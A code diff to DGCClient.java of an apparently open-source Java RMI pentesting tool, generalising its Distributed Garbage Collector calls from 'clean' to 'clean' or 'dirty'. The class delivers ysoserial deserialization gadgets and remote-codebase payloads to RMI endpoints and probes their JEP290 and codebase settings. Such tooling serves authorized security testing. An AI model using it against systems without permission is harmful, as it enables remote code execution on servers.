@@ -1,10 +1,6 @@
 package de.qtc.rmg.operations;
 
-import java.io.IOException;
-import java.net.SocketException;
-import java.rmi.UnknownHostException;
 import java.rmi.server.ObjID;
-import java.rmi.server.RemoteRef;
 import java.util.HashMap;
 
 import de.qtc.rmg.internal.ExceptionHandler;
@@ -12,24 +8,20 @@ import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.MaliciousOutputStream;
 import de.qtc.rmg.networking.RMIWhisperer;
 import de.qtc.rmg.utils.DefinitelyNonExistingClass;
-import sun.rmi.server.UnicastRef;
-import sun.rmi.transport.Endpoint;
-import sun.rmi.transport.LiveRef;
-import sun.rmi.transport.StreamRemoteCall;
 
-@SuppressWarnings("restriction")
 public class DGCClient {
 
     private RMIWhisperer rmi;
-    private static final long interfaceHash = -669196253586618813L;
 
+    private static final long interfaceHash = -669196253586618813L;
+    private static final ObjID objID = new ObjID(ObjID.DGC_ID);
 
     public DGCClient(RMIWhisperer rmiRegistry)
     {
         this.rmi = rmiRegistry;
     }
 
-    public void enumDGC()
+    public void enumDGC(String callName)
     {
         try {
             Logger.printlnBlue("RMI DGC enumeration:");
@@ -37,7 +29,7 @@ public class DGCClient {
             Logger.increaseIndent();
 
             MaliciousOutputStream.setDefaultLocation("InvalidURL");
-            cleanCall(new DefinitelyNonExistingClass(), true);
+            dgcCall(callName, packArgsByName(callName, new DefinitelyNonExistingClass()), true);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -69,7 +61,7 @@ public class DGCClient {
                 }
 
             } else if( t instanceof java.net.MalformedURLException) {
-                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during clean call.");
+                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + callName + " call.");
                 Logger.printMixedBlue("  --> The DGC", "attempted to parse", "the provided codebase ");
                 Logger.printlnPlainYellow("(useCodebaseOnly=false).");
                 Logger.statusNonDefault();
@@ -88,14 +80,14 @@ public class DGCClient {
         }
     }
 
-    public void enumJEP290()
+    public void enumJEP290(String callName)
     {
         try {
             Logger.printlnBlue("RMI server JEP290 enumeration:");
             Logger.println("");
             Logger.increaseIndent();
 
-            cleanCall(new HashMap<String,String>(), false);
+            dgcCall(callName, packArgsByName(callName, new HashMap<String,String>()), false);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -134,19 +126,19 @@ public class DGCClient {
         }
     }
 
-    public void codebaseCleanCall(Object payload)
+    public void codebaseCall(String callName, Object payloadObject)
     {
-        String className = payload.getClass().getName();
+        String className = payloadObject.getClass().getName();
 
         try {
             Logger.printlnBlue("Attempting codebase attack on DGC endpoint...");
             Logger.print("Using class ");
             Logger.printPlainMixedBlueFirst(className, "with codebase", System.getProperty("java.rmi.server.codebase"));
-            Logger.printlnPlainMixedYellow(" during", "clean", "call.");
+            Logger.printlnPlainMixedYellow(" during", callName, "call.");
             Logger.println("");
             Logger.increaseIndent();
 
-            cleanCall(payload, false);
+            dgcCall(callName, packArgsByName(callName, payloadObject), false);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -157,7 +149,7 @@ public class DGCClient {
                 ExceptionHandler.showStackTrace(e);
 
             } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
-                ExceptionHandler.unsupportedClassVersion(e, "clean", "call");
+                ExceptionHandler.unsupportedClassVersion(e, callName, "call");
 
             } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
                 ExceptionHandler.codebaseSecurityManager(e);
@@ -169,28 +161,28 @@ public class DGCClient {
                 ExceptionHandler.codebaseClassCast(e, false);
 
             } else if( cause instanceof java.security.AccessControlException) {
-                ExceptionHandler.accessControl(e, "clean", "call");
+                ExceptionHandler.accessControl(e, callName, "call");
 
             } else {
-                ExceptionHandler.unexpectedException(e, "clean", "call", false);
+                ExceptionHandler.unexpectedException(e, callName, "call", false);
             }
 
         } catch( java.lang.ClassCastException e ) {
             ExceptionHandler.codebaseClassCast(e, false);
 
         } catch( Exception e ) {
-            ExceptionHandler.unexpectedException(e, "clean", "call", false);
+            ExceptionHandler.unexpectedException(e, callName, "call", false);
         }
     }
 
-    public void attackCleanCall(Object payload)
+    public void gadgetCall(String callName, Object payloadObject)
     {
         try {
             Logger.printlnBlue("Attempting ysoserial attack on DGC endpoint...");
             Logger.println("");
             Logger.increaseIndent();
 
-            cleanCall(payload, false);
+            dgcCall(callName, packArgsByName(callName, payloadObject), false);
 
         } catch( java.rmi.ServerException e ) {
 
@@ -213,70 +205,40 @@ public class DGCClient {
             ExceptionHandler.deserlializeClassCast(e, false);
 
         } catch( Exception e ) {
-            ExceptionHandler.unexpectedException(e, "clean", "call", false);
+            ExceptionHandler.unexpectedException(e, callName, "call", false);
         }
     }
 
-    /**
-     * Make a call to the Distributed Garbage Collector (DGC) of an RMI endpoint.
-     *
-     * @param hostname the targeted hostname where the rmiregistry is located
-     * @param port the
-     * @param payloadObject
-     * @throws Exception
-     * @throws IOException
-     * @throws UnknownHostException
-     * @throws SocketException
-     */
-    @SuppressWarnings("deprecation")
-    public void cleanCall(Object payloadObject, boolean maliciousStream) throws Exception
+    private void dgcCall(String callName, Object[] callArguments, boolean maliciousStream) throws Exception
     {
-        try {
-            Endpoint endpoint = rmi.getEndpoint();
-            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.DGC_ID), endpoint, false));
+        rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);
+    }
 
-            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 0, interfaceHash);
-            try {
-                java.io.ObjectOutput out = call.getOutputStream();
-                out.writeObject(new ObjID[] {});
-                out.writeLong(0L);
-                out.writeObject(payloadObject);
-                out.writeBoolean(true);
-
-            } catch(java.io.IOException e) {
-                throw new java.rmi.MarshalException("error marshalling arguments", e);
-            }
-
-            remoteRef.invoke(call);
-            remoteRef.done(call);
-
-        } catch(java.rmi.ConnectException e) {
-
-            Throwable t = ExceptionHandler.getCause(e);
-
-            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
-                ExceptionHandler.connectionRefused(e, "clean", "call");
-
-            } else {
-                ExceptionHandler.unexpectedException(e, "clean", "call", true);
-            }
-
-        } catch(java.rmi.ConnectIOException e) {
-
-            Throwable t = ExceptionHandler.getCause(e);
-
-            if( t instanceof java.net.NoRouteToHostException) {
-                ExceptionHandler.noRouteToHost(e, "clean", "call");
-
-            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
-                ExceptionHandler.noJRMPServer(e, "clean", "call");
-
-            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
-                ExceptionHandler.sslError(e, "clean", "call");
-
-            } else {
-                ExceptionHandler.unexpectedException(e, "clean", "call", true);
-            }
+    private int getCallByName(String callName)
+    {
+        switch(callName) {
+            case "clean":
+                return 0;
+            case "dirty":
+                return 1;
+            default:
+                ExceptionHandler.internalError("DGCClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
         }
+
+        return 0;
+    }
+
+    private Object[] packArgsByName(String callName, Object payloadObject)
+    {
+        switch(callName) {
+            case "clean":
+                return new Object[] {new ObjID[]{}, 0L, payloadObject, true};
+            case "dirty":
+                return new Object[] {new ObjID[]{}, 0L, payloadObject};
+            default:
+                ExceptionHandler.internalError("DGCClient.packArgsByName", "Unable to find pack strategie for method '" + callName + "'.");
+        }
+
+        return null;
     }
 }
